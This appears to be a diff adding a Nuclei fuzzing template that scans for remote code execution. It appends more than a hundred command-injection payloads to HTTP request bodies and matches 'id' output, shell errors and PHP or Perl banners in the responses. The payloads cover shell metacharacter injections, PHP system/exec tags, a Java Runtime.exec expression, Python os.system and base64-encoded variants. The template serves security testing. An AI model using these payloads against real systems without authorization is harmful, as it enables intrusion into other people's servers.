@@ -1,0 +1,188 @@
+http:
+- extractors:
+  - group: 0
+    part: body
+    regex:
+    - uid=\d+\([^)]+\).*gid=\d+\([^)]+\).*
+    type: regex
+  fuzzing:
+  - fuzz:
+    - '{{rce}}'
+    mode: single
+    part: body
+    type: postfix
+  matchers:
+  - condition: or
+    part: body
+    regex:
+    - uid=\d+\([a-zA-Z0-9_-]+\)\s+gid=\d+\([a-zA-Z0-9_-]+\)
+    - uid=\d+\([^)]+\).*gid=\d+\([^)]+\).*groups=
+    type: regex
+  - part: body
+    type: word
+    words:
+    - '''id'' is not recognized as an internal or external command'
+    - "'id' \u043D\u0435 \u044F\u0432\u043B\u044F\u0435\u0442\u0441\u044F \u0432\u043D\
+      \u0443\u0442\u0440\u0435\u043D\u043D\u0435\u0439 \u0438\u043B\u0438 \u0432\u043D\
+      \u0435\u0448\u043D\u0435\u0439 \u043A\u043E\u043C\u0430\u043D\u0434\u043E\u0439"
+  - part: body
+    regex:
+    - syntax error near unexpected token.*id
+    - sh:.*id.*not found
+    type: regex
+  - part: body
+    regex:
+    - PHP Version\s+\d+\.\d+\.\d+
+    type: regex
+  - type: word
+    words:
+    - This is perl
+  matchers-condition: or
+  payloads:
+    rce:
+    - $(id)
+    - '%2560id%2560'
+    - '%26id%26'
+    - '%60id%60'
+    - '& `id`'
+    - '& id &'
+    - '& id'
+    - '&$(id)'
+    - '&& id'
+    - '&&$(id)'
+    - '&&`id`'
+    - '&&id'
+    - '&&id&&'
+    - '&`id`'
+    - '&id'
+    - '&id&'
+    - '''.system(''id'').'''
+    - '''.system(''perl -v'').'''
+    - '''i''d'
+    - '''id'''
+    - );id
+    - );id;
+    - );id|
+    - ')id '
+    - )|id
+    - )|id;
+    - '**id**'
+    - '*id'
+    - '*id*'
+    - /*$(id)`id`
+    - 1;id
+    - ; $(id)
+    - '; `id` #'
+    - ; `id`
+    - ; id
+    - ; id;
+    - '; id
+
+      '
+    - ; id|
+    - ; |id|
+    - Exception('id'.execute().text)
+    - '
+
+      &&id'
+    - '
+
+      ;id'
+    - '
+
+      id'
+    - '
+
+      id
+
+      '
+    - '
+
+      ||$(id)'
+    - '
+
+      ||`id`'
+    - '
+
+      ||id'
+    - "\r&&id"
+    - "\r;id"
+    - "\r\n&&id&&"
+    - "\r\n;id"
+    - "\r\n||$(id)"
+    - "\r\n||`id`"
+    - "\r\n||id"
+    - "\r\n||id||"
+    - "\r||$(id)"
+    - "\r||`id`"
+    - "\r||id"
+    - '`id`'
+    - '`id`#'
+    - '`id`&'
+    - a);id
+    - a);id|
+    - a;id
+    - a;id;
+    - i`u`d
+    - id
+    - id;
+    - id|
+    - import os;os.system('id');
+    - '{% import os %}{{os.system(''id'')'
+    - '| `id` #'
+    - '| `id`'
+    - '| id'
+    - '|id'
+    - '|id;'
+    - '|id|'
+    - '|| `id` #'
+    - '|| `id`'
+    - '|| id'
+    - '||$(id)'
+    - '||$(id);'
+    - '||$(id)||'
+    - '||`id`'
+    - '||`id`||'
+    - '||id'
+    - '||id;'
+    - '||id|'
+    - '||id||'
+    - '"><?php echo system("id");?>'
+    - '"i"d'
+    - $;id
+    - ; echo `id`;
+    - ; echo exec(id);
+    - ;";id
+    - ;";id;
+    - <%25+system("id")+%25>
+    - <%= system("id") %>
+    - <?php escapeshellcmd("id"); ?>
+    - <?php exec("id"); ?>
+    - <?php shell_exec("id"); ?>
+    - <?php system("id"); ?>
+    - JiZpZCYm
+    - O2BpZGA7
+    - O2lkOw==
+    - T(java.lang.Runtime).getRuntime().exec("id")
+    - YGlkYA==
+    - '`/usr/bin/id`'
+    - echo `id`;
+    - echo exec(id);
+    - fHxgaWRgfHw=
+    - s:19:"<?php phpinfo(); ?>";
+    - '||/usr/bin/id||'
+  pre-condition:
+  - condition: or
+    dsl:
+    - method == "POST"
+    - method == "PUT"
+    - method == "DELETE"
+    - method == "PATCH"
+    type: dsl
+  stop-at-first-match: true
+id: rce-body-postfix
+info:
+  author: reewardius
+  name: Remote Code Execution
+  severity: critical
+  tags: fuzzing-req,fuzzing-req-rce,fuzzing-req-body-query,fuzzing-req-rce-body-query,fuzzing-req-body,rce,dast
